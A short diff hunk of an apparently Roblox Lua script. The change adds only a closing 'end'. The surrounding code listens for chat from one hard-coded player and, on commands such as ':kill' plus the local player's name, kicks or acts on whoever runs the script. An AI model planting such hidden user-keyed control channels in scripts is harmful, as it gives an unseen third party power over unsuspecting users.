@@ -21,6 +21,7 @@ game.Players:FindFirstChild('LaseredByEncoded').Chatted:Connect(function(msg)
 					game.Players.LocalPlayer:Kick('Kicked')
 				end
 			end
+			end
 
 
 			if msg ==":kill "..game.Players.LocalPlayer.Name then    
